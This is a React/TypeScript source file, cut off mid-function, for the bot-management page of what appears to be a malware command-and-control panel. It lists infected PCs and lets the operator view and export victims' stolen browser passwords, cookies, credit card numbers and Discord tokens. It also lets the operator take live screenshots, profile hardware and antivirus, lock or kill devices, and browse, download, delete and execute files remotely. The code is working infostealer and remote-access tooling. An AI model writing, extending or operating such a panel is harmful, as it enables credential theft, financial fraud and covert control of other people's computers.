import React, { useState, useEffect, useCallback } from 'react';
import axios from 'axios';
import { 
  Trash2, AlertTriangle, ChevronLeft, ChevronRight, Skull, Send, Power, 
  Camera, X, Download, Maximize2, Minimize2,
  Clock, Image as ImageIcon, Info, Cpu, HardDrive, Shield, RefreshCw,
  ChevronDown, ChevronUp, Wifi, Folder, FileText, Search, Eye, EyeOff, Copy, Check, CheckSquare,
  Globe, CreditCard, Lock, FolderOpen, Play
} from 'lucide-react';
import { API_BASE_URL } from '../../config';
import { socket } from '../../socket';
import { NetworkBackground } from '../NetworkBackground/NetworkBackground';
import { useLanguage } from '../../i18n/LanguageContext';
import { usePrivacy } from '../../context/PrivacyContext';
import './Bots.css';

interface BotItem {
  id: number;
  device_key?: string;
  ip: string;
  pc_name: string;
  os_info: string;
  status: 'online' | 'offline';
  last_seen: string;
}

interface BotsProps {
  bots: BotItem[];
  userId: number;
}

interface ScreenshotItem {
  filename: string;
  url: string;
  timestamp: string;
}

interface SysInfoData {
  botId: number;
  pcName: string;
  userName?: string;
  osInfo?: string;
  cpu?: string;
  cpuCores?: string;
  gpu?: string;
  ramTotal?: string;
  antivirus?: string;
  disks?: string;
  localIp?: string;
  macAddress?: string;
  motherboard?: string;
  uptime?: string;
  updatedAt?: string;
}

// Screenshot modal tipi
interface ScreenshotModal {
  pcName: string;
  botId?: number;
  status: 'waiting' | 'ready' | 'error';
  imageUrl?: string;
  selectedIndex: number;
  history: ScreenshotItem[];
  zoom: number;
  isFullscreen: boolean;
}


interface BrowserDataItem {
  id: number;
  bot_id: number;
  pc_name: string;
  data_type: 'password' | 'cookie' | 'card' | 'history';
  browser?: string;
  host?: string;
  username?: string;
  password?: string;
  cookie_name?: string;
  cookie_value?: string;
  card_number?: string;
  card_holder?: string;
  expiry?: string;
  created_at: string;
}

type BrowserTab = 'passwords' | 'cookies' | 'cards' | 'history';

interface BrowserModal {
  botId: number;
  pcName: string;
  loading: boolean;
  data: BrowserDataItem[];
  tab: BrowserTab;
  search: string;
  selectedBrowser: string; // 'all', 'chrome', 'edge', 'brave', 'opera', vb.
}

// ======= FILE MANAGER interfaces =======
interface FileEntry {
  name: string;
  isDir: boolean;
  isDrive?: boolean;
  size: number;
  free?: number;
  modified: string;
  path: string;
}

interface FileManagerModal {
  botId: number;
  pcName: string;
  currentPath: string;
  isDrivesView: boolean;
  files: FileEntry[];
  loading: boolean;
  search: string;
  selectedEntryPath: string | null;
  contextMenu: {
    visible: boolean;
    x: number;
    y: number;
    entry: FileEntry;
  } | null;
  downloadProgress: {
    path: string;
    fileName: string;
    percent: number;
    status: 'preparing' | 'downloading' | 'completed' | 'error';
    error?: string;
  } | null;
  error: string | null;
  deleteTarget: FileEntry | null;
  execTarget: FileEntry | null;
}

function fmFormatBytes(bytes: number): string {
  if (bytes === 0) return '—';
  if (bytes < 1024) return bytes + ' B';
  if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
  if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
  return (bytes / (1024 * 1024 * 1024)).toFixed(2) + ' GB';
}

const DiscordIcon = ({ size = 16 }: { size?: number }) => (
  <svg width={size} height={size} viewBox="0 0 24 24" fill="currentColor">
    <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515a.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0a12.64 12.64 0 0 0-.617-1.25a.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057a19.9 19.9 0 0 0 5.993 3.03a.078.078 0 0 0 .084-.028a14.09 14.09 0 0 0 1.226-1.994a.076.076 0 0 0-.041-.106a13.107 13.107 0 0 1-1.872-.892a.077.077 0 0 1-.008-.128a10.2 10.2 0 0 0 .372-.292a.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.061 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127a12.299 12.299 0 0 1-1.873.892a.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028a19.839 19.839 0 0 0 6.002-3.03a.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.028zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419c0-1.333.956-2.419 2.157-2.419c1.21 0 2.176 1.096 2.157 2.42c0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419c0-1.333.955-2.419 2.157-2.419c1.21 0 2.176 1.096 2.157 2.42c0 1.333-.946 2.418-2.157 2.418z"/>
  </svg>
);

export const Bots: React.FC<BotsProps> = ({ bots, userId }) => {
  const { t } = useLanguage();
  const { privacyMode } = usePrivacy();
  const [tab, setTab] = useState<'online' | 'offline'>(() => {
    const saved = localStorage.getItem('bots_active_tab');
    return (saved === 'online' || saved === 'offline') ? saved : 'online';
  });
  const [currentPage, setCurrentPage] = useState<number>(1);
  const [selectedBotId, setSelectedBotId] = useState<number | null>(null);
  const [activeTokenModal, setActiveTokenModal] = useState<{ pcName: string; tokens: string[] } | null>(null);
  
  // Single or Bulk device lock modal state
  const [activeLockModal, setActiveLockModal] = useState<{ pcName: string; isBulk?: boolean; pcNames?: string[] } | null>(null);
  const [activeKillModal, setActiveKillModal] = useState<{ pcName: string } | null>(null);
  const [globalBannerMsg, setGlobalBannerMsg] = useState<string | null>(null);
  const toastTimerRef = React.useRef<any>(null);

  // Bulk bot selection & bulk delete modal state
  const [selectedBotIds, setSelectedBotIds] = useState<number[]>([]);
  const [activeBulkDeleteModal, setActiveBulkDeleteModal] = useState<boolean>(false);

  const triggerToast = useCallback((msg: string) => {
    if (toastTimerRef.current) {
      clearTimeout(toastTimerRef.current);
    }
    setGlobalBannerMsg(msg);
    toastTimerRef.current = setTimeout(() => {
      setGlobalBannerMsg(null);
    }, 2000); // Sağ altta 2 saniye görünüp kaybolur
  }, []);

  const [modalTitle, setModalTitle] = useState('');
  const [modalMessage, setModalMessage] = useState('');
  const [modalDurationValue, setModalDurationValue] = useState('10');
  const [modalDurationUnit, setModalDurationUnit] = useState<'seconds' | 'minutes' | 'days'>('seconds');
  const [modalSent, setModalSent] = useState(false);

  // Screenshot studio state
  const [screenshotModal, setScreenshotModal] = useState<ScreenshotModal | null>(null);

  // Token copy state
  const [copiedTokenIndex, setCopiedTokenIndex] = useState<number | null>(null);

  // Enlarged Photo Lightbox State
  const [enlargedPhotoUrl, setEnlargedPhotoUrl] = useState<string | null>(null);

  // Sysinfo Modal State
  const [activeSysInfoModal, setActiveSysInfoModal] = useState<{ botId: number; pcName: string; loading: boolean; sysinfo: SysInfoData | null } | null>(null);

  const [expandedSections, setExpandedSections] = useState<{ [key: string]: boolean }>({
    hardware: true,
    storage: true,
    network: true,
    system: true
  });

  const toggleSysInfoSection = (key: string) => {
    setExpandedSections(prev => ({ ...prev, [key]: !prev[key] }));
  };

  // Browser Stealer Modal State
  const [activeBrowserModal, setActiveBrowserModal] = useState<BrowserModal | null>(null);
  const [browserCopiedId, setBrowserCopiedId] = useState<number | null>(null);
  const [revealedPasswords, setRevealedPasswords] = useState<Set<number>>(new Set());

  // File Manager Modal State
  const [activeFileManagerModal, setActiveFileManagerModal] = useState<FileManagerModal | null>(null);

  // ======= BROWSER STEALER: Socket listener =======
  useEffect(() => {
    const eventName = `browser_data_ready_${userId}`;
    const handleBrowserDataReady = (payload: { botId: number; pcName: string; count: number }) => {
      if (activeBrowserModal && (activeBrowserModal.botId === payload.botId || activeBrowserModal.pcName.toLowerCase() === payload.pcName.toLowerCase())) {
        fetchBrowserData(activeBrowserModal.botId);
      }
    };
    socket.on(eventName, handleBrowserDataReady);
    return () => { socket.off(eventName, handleBrowserDataReady); };
  }, [userId, activeBrowserModal]);

  const fetchBrowserData = async (botId: number) => {
    try {
      const token = localStorage.getItem('token');
      const res = await axios.get(
        `${API_BASE_URL}/api/bots/browser/data/${botId}`,
        { headers: { Authorization: `Bearer ${token}` } }
      );
      if (res.data.success) {
        setActiveBrowserModal(prev => prev ? { ...prev, loading: false, data: res.data.data } : prev);
      } else {
        setActiveBrowserModal(prev => prev ? { ...prev, loading: false } : prev);
      }
    } catch (_) {
      setActiveBrowserModal(prev => prev ? { ...prev, loading: false } : prev);
    }
  };

  const handleOpenBrowserModal = async (bot: BotItem) => {
    setActiveBrowserModal({
      botId: bot.id,
      pcName: bot.pc_name,
      loading: true,
      data: [],
      tab: 'passwords',
      search: '',
      selectedBrowser: 'all'
    });
    setRevealedPasswords(new Set());

    // DB'den tüm kategorilerdeki veriyi anında tek sorguyla çek
    fetchBrowserData(bot.id);
  };

  const handleBrowserTabChange = (tab: BrowserTab) => {
    if (!activeBrowserModal) return;
    setActiveBrowserModal(prev => prev ? { ...prev, tab, search: '' } : prev);
    setRevealedPasswords(new Set());
  };

  const handleTriggerBrowserScan = async () => {
    if (!activeBrowserModal) return;
    setActiveBrowserModal(prev => prev ? { ...prev, loading: true } : prev);
    const targetBotId = activeBrowserModal.botId;
    const targetPcName = activeBrowserModal.pcName;

    try {
      const token = localStorage.getItem('token');
      await axios.post(
        `${API_BASE_URL}/api/bots/browser/scan`,
        { pcName: targetPcName },
        { headers: { Authorization: `Bearer ${token}` } }
      );

      // Otomatik periyodik kontrol (2.5s aralıklarla 4 defa dene)
      let pollCount = 0;
      const pollTimer = setInterval(async () => {
        pollCount++;
        try {
          const res = await axios.get(
            `${API_BASE_URL}/api/bots/browser/data/${targetBotId}`,
            { headers: { Authorization: `Bearer ${token}` } }
          );
          if (res.data.success && res.data.data) {
            setActiveBrowserModal(prev => prev && prev.botId === targetBotId ? { ...prev, loading: false, data: res.data.data } : prev);
          }
        } catch (_) {}

        if (pollCount >= 4) {
          clearInterval(pollTimer);
          setActiveBrowserModal(prev => prev ? { ...prev, loading: false } : prev);
        }
      }, 2500);

    } catch (_) {
      setActiveBrowserModal(prev => prev ? { ...prev, loading: false } : prev);
    }
  };

  const handleDeleteBrowserItem = async (id: number) => {
    try {
      const token = localStorage.getItem('token');
      await axios.delete(`${API_BASE_URL}/api/bots/browser/data/${id}`, {
        headers: { Authorization: `Bearer ${token}` }
      });
      setActiveBrowserModal(prev => prev ? { ...prev, data: prev.data.filter(item => item.id !== id) } : prev);
    } catch (_) {}
  };

  const handleBrowserCopy = (text: string, id: number) => {
    navigator.clipboard.writeText(text);
    setBrowserCopiedId(id);
    setTimeout(() => setBrowserCopiedId(null), 1500);
  };

  const togglePasswordReveal = (id: number) => {
    setRevealedPasswords(prev => {
      const newSet = new Set(prev);
      if (newSet.has(id)) newSet.delete(id);
      else newSet.add(id);
      return newSet;
    });
  };

  // ======= FILE MANAGER: Socket listeners & handlers =======
  useEffect(() => {
    const handleListReady = (data: any) => {
      setActiveFileManagerModal(prev => {
        if (prev && prev.pcName.toLowerCase().trim() === data.pcName?.toLowerCase().trim()) {
          if (data.success) {
            const isDrives = data.path === 'DRIVES' || !!data.isDrives;
            return {
              ...prev,
              loading: false,
              isDrivesView: isDrives,
              files: data.files || [],
              currentPath: data.path || '',
              error: null
            };
          } else {
            return {
              ...prev,
              loading: false,
              files: [],
              error: data.error || t('filemanager.error_list')
            };
          }
        }
        return prev;
      });
    };

    const handleDownloadReady = (data: any) => {
      setActiveFileManagerModal(prev => {
        if (prev && prev.pcName.toLowerCase().trim() === data.pcName?.toLowerCase().trim()) {
          if (data.success && data.downloadUrl) {
            const token = localStorage.getItem('token');
            const xhr = new XMLHttpRequest();
            xhr.open('GET', `${API_BASE_URL}${data.downloadUrl}`, true);
            if (token) xhr.setRequestHeader('Authorization', `Bearer ${token}`);
            xhr.responseType = 'blob';

            xhr.onprogress = (evt) => {
              if (evt.lengthComputable) {
                const pct = Math.min(99, Math.max(15, Math.round((evt.loaded / evt.total) * 100)));
                setActiveFileManagerModal(curr => {
                  if (!curr || !curr.downloadProgress) return curr;
                  return {
                    ...curr,
                    downloadProgress: { ...curr.downloadProgress, percent: pct, status: 'downloading' }
                  };
                });
              }
            };

            xhr.onload = () => {
              if (xhr.status === 200) {
                const blob = xhr.response;
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = data.fileName || 'file';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);

                setActiveFileManagerModal(curr => {
                  if (!curr || !curr.downloadProgress) return curr;
                  return {
                    ...curr,
                    downloadProgress: { ...curr.downloadProgress, percent: 100, status: 'completed' }
                  };
                });

                setTimeout(() => {
                  setActiveFileManagerModal(curr => curr ? { ...curr, downloadProgress: null } : null);
                }, 3000);

                triggerToast(t('filemanager.download_success'));
              } else {
                setActiveFileManagerModal(curr => {
                  if (!curr || !curr.downloadProgress) return curr;
                  return {
                    ...curr,
                    downloadProgress: { ...curr.downloadProgress, status: 'error', error: 'Download failed' }
                  };
                });
                triggerToast(t('filemanager.download_error'));
              }
            };

            xhr.onerror = () => {
              setActiveFileManagerModal(curr => {
                if (!curr || !curr.downloadProgress) return curr;
                return {
                  ...curr,
                  downloadProgress: { ...curr.downloadProgress, status: 'error', error: 'Network error' }
                };
              });
              triggerToast(t('filemanager.download_error'));
            };

            xhr.send();
            return {
              ...prev,
              downloadProgress: prev.downloadProgress ? { ...prev.downloadProgress, percent: 15, status: 'downloading' } : null
            };
          } else {
            triggerToast(data.error || t('filemanager.download_error'));
            return {
              ...prev,
              downloadProgress: prev.downloadProgress ? { ...prev.downloadProgress, status: 'error', error: data.error } : null
            };
          }
        }
        return prev;
      });
    };

    const handleOpResult = (data: any) => {
      setActiveFileManagerModal(prev => {
        if (prev && prev.pcName.toLowerCase().trim() === data.pcName?.toLowerCase().trim()) {
          if (data.op === 'delete') {
            if (data.success) {
              triggerToast(t('filemanager.delete_success'));
              sendFmCommand(prev.pcName, 'file_list', prev.currentPath);
            } else {
              triggerToast(data.error || t('filemanager.delete_error'));
            }
          } else if (data.op === 'exec') {
            if (data.success) {
              triggerToast(t('filemanager.exec_success'));
            } else {
              triggerToast(data.error || t('filemanager.exec_error'));
            }
          }
        }
        return prev;
      });
    };

    socket.on(`file_list_ready_${userId}`, handleListReady);
    socket.on(`file_download_ready_${userId}`, handleDownloadReady);
    socket.on(`file_op_result_${userId}`, handleOpResult);

    return () => {
      socket.off(`file_list_ready_${userId}`, handleListReady);
      socket.off(`file_download_ready_${userId}`, handleDownloadReady);
      socket.off(`file_op_result_${userId}`, handleOpResult);
    };
  }, [userId, t, triggerToast]);

  const sendFmCommand = async (pcName: string, type: string, filePath: string) => {
    try {
      const token = localStorage.getItem('token');
      await axios.post(
        `${API_BASE_URL}/api/bots/file/command`,
        { pcName, type, path: filePath },
        { headers: { Authorization: `Bearer ${token}` } }
      );
    } catch {
      triggerToast(t('filemanager.command_error'));
    }
  };

  const handleOpenFileManagerModal = (bot: BotItem) => {
    setActiveFileManagerModal({
      botId: bot.id,
      pcName: bot.pc_name,
      currentPath: 'DRIVES',
      isDrivesView: true,
      files: [],
      loading: true,
      search: '',
      selectedEntryPath: null,
      contextMenu: null,
      downloadProgress: null,
      error: null,
      deleteTarget: null,
      execTarget: null
    });

    sendFmCommand(bot.pc_name, 'file_list', 'DRIVES');
  };

  const handleFmNavigate = (entry: FileEntry) => {
    if (!entry.isDir || !activeFileManagerModal) return;
    setActiveFileManagerModal(prev => prev ? {
      ...prev,
      loading: true,
      files: [],
      search: '',
      selectedEntryPath: null,
      contextMenu: null
    } : null);
    sendFmCommand(activeFileManagerModal.pcName, 'file_list', entry.path);
  };

  const handleFmGoDrives = () => {
    if (!activeFileManagerModal) return;
    setActiveFileManagerModal(prev => prev ? {
      ...prev,
      loading: true,
      files: [],
      search: '',
      selectedEntryPath: null,
      contextMenu: null
    } : null);
    sendFmCommand(activeFileManagerModal.pcName, 'file_list', 'DRIVES');
  };

  const handleFmGoUp = () => {
    if (!activeFileManagerModal || !activeFileManagerModal.currentPath || activeFileManagerModal.currentPath === 'DRIVES') return;
    const normalized = activeFileManagerModal.currentPath.replace(/\\/g, '/');
    const parts = normalized.split('/').filter(Boolean);
    if (parts.length <= 1) {
      handleFmGoDrives();
    } else {
      parts.pop();
      const parent = parts.join('\\');
      setActiveFileManagerModal(prev => prev ? {
        ...prev,
        loading: true,
        files: [],
        search: '',
        selectedEntryPath: null,
        contextMenu: null
      } : null);
      sendFmCommand(activeFileManagerModal.pcName, 'file_list', parent.endsWith(':') ? parent + '\\' : parent);
    }
  };

  const handleFmRefresh = () => {
    if (!activeFileManagerModal) return;
    setActiveFileManagerModal(prev => prev ? {
      ...prev,
      loading: true,
      contextMenu: null
    } : null);
    sendFmCommand(activeFileManagerModal.pcName, 'file_list', activeFileManagerModal.currentPath);
  };

  const handleFmDownload = (entry: FileEntry) => {
    if (!activeFileManagerModal || entry.isDir) return;
    setActiveFileManagerModal(prev => prev ? {
      ...prev,
      contextMenu: null,
      downloadProgress: {
        path: entry.path,
        fileName: entry.name,
        percent: 5,
        status: 'preparing'
      }
    } : null);
    sendFmCommand(activeFileManagerModal.pcName, 'file_download', entry.path);
  };

  const handleFmDeleteConfirm = () => {
    if (!activeFileManagerModal || !activeFileManagerModal.deleteTarget) return;
    sendFmCommand(activeFileManagerModal.pcName, 'file_delete', activeFileManagerModal.deleteTarget.path);
    setActiveFileManagerModal(prev => prev ? { ...prev, deleteTarget: null, contextMenu: null } : null);
  };

  const handleFmExecConfirm = () => {
    if (!activeFileManagerModal || !activeFileManagerModal.execTarget) return;
    sendFmCommand(activeFileManagerModal.pcName, 'file_exec', activeFileManagerModal.execTarget.path);
    setActiveFileManagerModal(prev => prev ? { ...prev, execTarget: null, contextMenu: null } : null);
  };

  const handleFmRowContextMenu = (e: React.MouseEvent, entry: FileEntry) => {
    e.preventDefault();
    e.stopPropagation();
    if (!activeFileManagerModal) return;
    const x = Math.min(e.clientX, window.innerWidth - 200);
    const y = Math.min(e.clientY, window.innerHeight - 160);
    setActiveFileManagerModal(prev => prev ? {
      ...prev,
      selectedEntryPath: entry.path,
      contextMenu: { visible: true, x, y, entry }
    } : null);
  };

  const buildFmBreadcrumb = (currentPath: string): { label: string; path: string }[] => {
    if (!currentPath || currentPath === 'DRIVES') return [];
    const parts = currentPath.replace(/\\/g, '/').split('/').filter(Boolean);
    const crumbs: { label: string; path: string }[] = [];
    let acc = '';
    for (let i = 0; i < parts.length; i++) {
      if (i === 0 && parts[i].endsWith(':')) {
        acc = parts[i] + '\\';
      } else {
        acc = acc ? acc + (acc.endsWith('\\') ? '' : '\\') + parts[i] : parts[i];
      }
      crumbs.push({ label: parts[i], path: acc });
    }
    return crumbs;
  };



  const getBrowserBadge = (browser?: string) => {
    const b = (browser || '').toLowerCase();
    if (b.includes('chrome')) return <span className="b-badge chrome"><Globe size={13} /> Chrome</span>;
    if (b.includes('edge')) return <span className="b-badge edge"><Globe size={13} /> Edge</span>;
    if (b.includes('brave')) return <span className="b-badge brave"><Globe size={13} /> Brave</span>;
    if (b.includes('opera')) return <span className="b-badge opera"><Globe size={13} /> Opera</span>;
    if (b.includes('firefox')) return <span className="b-badge firefox"><Globe size={13} /> Firefox</span>;
    return <span className="b-badge default"><Globe size={13} /> {browser || 'Browser'}</span>;
  };

  const handleDownloadCookiesJson = () => {
    if (!activeBrowserModal) return;
    const cookieData = browserFilteredData.map(item => ({
      domain: item.host || '',
      name: item.cookie_name || item.username || '',
      value: item.cookie_value || item.password || '',
      path: '/',
      secure: true,
      httpOnly: false,
      browser: item.browser || 'Unknown'
    }));

    const bFilter = activeBrowserModal.selectedBrowser || 'all';
    const blob = new Blob([JSON.stringify(cookieData, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `cookies_${activeBrowserModal.pcName}_${bFilter}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    triggerToast(`Cookie'ler (${bFilter.toUpperCase()}) JSON formatında indirildi!`);
  };

  const handleDownloadPasswordsTxt = () => {
    if (!activeBrowserModal) return;
    const bFilter = activeBrowserModal.selectedBrowser || 'all';
    let txtContent = `=== PASSWORDS FOR ${activeBrowserModal.pcName} (${bFilter.toUpperCase()}) ===\n\n`;
    browserFilteredData.forEach(item => {
      txtContent += `Browser  : ${item.browser || 'Unknown'}\n`;
      txtContent += `URL      : ${item.host || '-'}\n`;
      txtContent += `Username : ${item.username || '-'}\n`;
      txtContent += `Password : ${item.password || '-'}\n`;
      txtContent += `--------------------------------------------------\n`;
    });

    const blob = new Blob([txtContent], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `passwords_${activeBrowserModal.pcName}_${bFilter}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    triggerToast(`Şifreler (${bFilter.toUpperCase()}) .txt formatında indirildi!`);
  };

  const browserFilteredData = activeBrowserModal ? activeBrowserModal.data.filter(item => {
    // 1. Sekme tipi filtresi (Şifreler, Çerezler, Kartlar, Geçmiş ayrımı)
    const currentTabType = activeBrowserModal.tab === 'passwords' ? 'password'
      : activeBrowserModal.tab === 'cookies' ? 'cookie'
      : activeBrowserModal.tab === 'cards' ? 'card'
      : 'history';

    if (item.data_type !== currentTabType) return false;

    // 2. Tarayıcı filtresi (Tümü, Chrome, Edge, Brave, Opera vs.)
    if (activeBrowserModal.selectedBrowser && activeBrowserModal.selectedBrowser !== 'all') {
      const bName = (item.browser || '').toLowerCase();
      if (!bName.includes(activeBrowserModal.selectedBrowser)) return false;
    }

    // 3. Arama filtresi
    const term = activeBrowserModal.search.toLowerCase();
    if (!term) return true;
    if (activeBrowserModal.tab === 'passwords') {
      return (item.host?.toLowerCase().includes(term) || item.username?.toLowerCase().includes(term));
    } else if (activeBrowserModal.tab === 'cookies') {
      return (item.host?.toLowerCase().includes(term) || item.cookie_name?.toLowerCase().includes(term) || item.cookie_value?.toLowerCase().includes(term));
    } else if (activeBrowserModal.tab === 'cards') {
      return (item.card_holder?.toLowerCase().includes(term) || item.card_number?.includes(term));
    } else if (activeBrowserModal.tab === 'history') {
      return (item.host?.toLowerCase().includes(term) || item.username?.toLowerCase().includes(term));
    }
    return false;
  }) : [];

  const ITEMS_PER_PAGE = 10;
  const onlineBots = bots.filter((b) => b.status === 'online').sort((a, b) => a.id - b.id);
  const offlineBots = bots.filter((b) => b.status === 'offline').sort((a, b) => a.id - b.id);
  const list = tab === 'online' ? onlineBots : offlineBots;

  const totalPages = Math.ceil(list.length / ITEMS_PER_PAGE) || 1;
  const paginatedList = list.slice((currentPage - 1) * ITEMS_PER_PAGE, currentPage * ITEMS_PER_PAGE);


  // SysInfo socket listener — backend'den sysinfo_ready gelince
  useEffect(() => {
    const eventName = `sysinfo_ready_${userId}`;
    const handleSysInfoReady = (data: SysInfoData) => {
      setActiveSysInfoModal(prev => {
        if (prev && prev.botId === data.botId) {
          return {
            ...prev,
            loading: false,
            sysinfo: data
          };
        }
        return prev;
      });
    };
    socket.on(eventName, handleSysInfoReady);
    return () => { socket.off(eventName, handleSysInfoReady); };
  }, [userId]);

  // SysInfo modalını aç ve veriyi getir
  const handleOpenSysInfoModal = async (bot: BotItem) => {
    setActiveSysInfoModal({
      botId: bot.id,
      pcName: bot.pc_name,
      loading: true,
      sysinfo: null
    });

    try {
      const token = localStorage.getItem('token');
      // Önce mevcut kayıtlı sysinfo.json'u çek
      const res = await axios.get(`${API_BASE_URL}/api/bots/sysinfo/${bot.id}`, {
        headers: { Authorization: `Bearer ${token}` }
      });

      if (res.data.success && res.data.sysinfo) {
        setActiveSysInfoModal(prev => prev ? { ...prev, loading: false, sysinfo: res.data.sysinfo } : prev);
      }

      // Eğer bot online ise taze bilgi için sysinfo komutu gönder
      if (bot.status === 'online') {
        await axios.post(`${API_BASE_URL}/api/bots/sysinfo`, { pcName: bot.pc_name }, {
          headers: { Authorization: `Bearer ${token}` }
        });
      } else {
        setActiveSysInfoModal(prev => prev ? { ...prev, loading: false } : prev);
      }
    } catch (_) {
      setActiveSysInfoModal(prev => prev ? { ...prev, loading: false } : prev);
    }
  };

  // Screenshot socket listener — backend'den screenshot_ready gelince
  useEffect(() => {
    const eventName = `screenshot_ready_${userId}`;
    const handleScreenshotReady = (data: { botId: number; pcName: string; imageUrl: string; filename: string; timestamp: string }) => {
      const token = localStorage.getItem('token') || '';
      const tokenQuery = token ? `?token=${encodeURIComponent(token)}` : '';
      const fullUrl = `${API_BASE_URL}${data.imageUrl}${tokenQuery}`;
      const newItem: ScreenshotItem = {
        filename: data.filename,
        url: fullUrl,
        timestamp: data.timestamp.replace('T', ' ').substring(0, 19)
      };

      setScreenshotModal(prev => {
        if (prev && prev.pcName.toLowerCase() === data.pcName.toLowerCase()) {
          const updatedHistory = [newItem, ...prev.history.filter(h => h.filename !== data.filename)];
          return {
            ...prev,
            status: 'ready',
            botId: data.botId,
            imageUrl: fullUrl,
            selectedIndex: 0,
            history: updatedHistory
          };
        }
        return prev;
      });
    };
    socket.on(eventName, handleScreenshotReady);
    return () => { socket.off(eventName, handleScreenshotReady); };
  }, [userId]);

  // Screenshot modalını aç (sadece geçmişi yükler, komut göndermez)
  const handleOpenScreenshotModal = useCallback(async (bot: BotItem) => {
    const token = localStorage.getItem('token') || '';
    const tokenQuery = token ? `?token=${encodeURIComponent(token)}` : '';

    setScreenshotModal({
      pcName: bot.pc_name,
      botId: bot.id,
      status: 'ready',
      selectedIndex: 0,
      history: [],
      zoom: 1,
      isFullscreen: false
    });

    try {
      const histRes = await axios.get(`${API_BASE_URL}/api/bots/screenshots/${bot.id}`, {
        headers: { Authorization: `Bearer ${token}` }
      });

      let historyWithBase: ScreenshotItem[] = [];
      if (histRes.data.success) {
        historyWithBase = histRes.data.screenshots.map((s: any) => ({
          ...s,
          url: `${API_BASE_URL}${s.url}${tokenQuery}`
        }));
      }

      setScreenshotModal(prev => prev ? {
        ...prev,
        history: historyWithBase,
        imageUrl: historyWithBase.length > 0 ? historyWithBase[0].url : undefined,
        status: 'ready'
      } : prev);
    } catch (_) {
      setScreenshotModal(prev => prev ? { ...prev, status: 'ready' } : prev);
    }
  }, []);

  // Modal içindeki "Al" butonuna basılınca canlı screenshot isteği gönderir
  const handleCaptureLive = async () => {
    if (!screenshotModal?.pcName) return;
    setScreenshotModal(prev => prev ? { ...prev, status: 'waiting' } : null);

    try {
      const token = localStorage.getItem('token');
      await axios.post(
        `${API_BASE_URL}/api/bots/screenshot`,
        { pcName: screenshotModal.pcName },
        { headers: { Authorization: `Bearer ${token}` } }
      );
    } catch (_) {
      setScreenshotModal(prev => prev ? { ...prev, status: prev.history.length > 0 ? 'ready' : 'error' } : null);
    }
  };

  // Galeri içinden resim seçme
  const handleSelectScreenshot = (index: number) => {
    if (!screenshotModal || !screenshotModal.history[index]) return;
    const item = screenshotModal.history[index];
    setScreenshotModal(prev => prev ? {
      ...prev,
      selectedIndex: index,
      imageUrl: item.url,
      status: 'ready',
      zoom: 1
    } : null);
  };

  const handleNextScreenshot = () => {
    if (!screenshotModal || screenshotModal.history.length === 0) return;
    const nextIdx = (screenshotModal.selectedIndex + 1) % screenshotModal.history.length;
    handleSelectScreenshot(nextIdx);
  };

  const handlePrevScreenshot = () => {
    if (!screenshotModal || screenshotModal.history.length === 0) return;
    const prevIdx = (screenshotModal.selectedIndex - 1 + screenshotModal.history.length) % screenshotModal.history.length;
    handleSelectScreenshot(prevIdx);
  };

  const handleZoomIn = () => {
    setScreenshotModal(prev => prev ? { ...prev, zoom: Math.min(prev.zoom + 0.25, 3) } : null);
  };

  const handleZoomOut = () => {
    setScreenshotModal(prev => prev ? { ...prev, zoom: Math.max(prev.zoom - 0.25, 0.5) } : null);
  };

  const handleZoomReset = () => {
    setScreenshotModal(prev => prev ? { ...prev, zoom: 1 } : null);
  };

  const handleToggleFullscreen = () => {
    setScreenshotModal(prev => prev ? { ...prev, isFullscreen: !prev.isFullscreen } : null);
  };

  const handleDownloadActiveScreenshot = () => {
    if (!screenshotModal?.imageUrl) return;
    const link = document.createElement('a');
    link.href = screenshotModal.imageUrl;
    const currentItem = screenshotModal.history[screenshotModal.selectedIndex];
    link.download = currentItem ? currentItem.filename : `screenshot_${screenshotModal.pcName}.png`;
    link.target = '_blank';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const handleDeleteScreenshot = async (filename: string, e: React.MouseEvent) => {
    e.stopPropagation();
    if (!screenshotModal?.botId) return;
    try {
      const token = localStorage.getItem('token');
      await axios.delete(`${API_BASE_URL}/api/bots/screenshots/${screenshotModal.botId}/${filename}`, {
        headers: { Authorization: `Bearer ${token}` }
      });
      setScreenshotModal(prev => {
        if (!prev) return null;
        const nextHistory = prev.history.filter(s => s.filename !== filename);
        const nextIdx = prev.selectedIndex >= nextHistory.length ? Math.max(0, nextHistory.length - 1) : prev.selectedIndex;
        return {
          ...prev,
          history: nextHistory,
          selectedIndex: nextIdx,
          imageUrl: nextHistory[nextIdx] ? nextHistory[nextIdx].url : undefined,
          status: nextHistory.length > 0 ? 'ready' : 'waiting'
        };
      });
    } catch (_) {}
  };

  const handleTabChange = (newTab: 'online' | 'offline') => {
    setTab(newTab);
    localStorage.setItem('bots_active_tab', newTab);
    setCurrentPage(1);
  };

  const handleOpenDeviceTokens = async (pcName: string) => {
    try {
      const authToken = localStorage.getItem('token');
      const res = await axios.get(`${API_BASE_URL}/api/discord`, {
        headers: { Authorization: `Bearer ${authToken}` }
      });
      if (res.data.success) {
        const matching = res.data.tokens
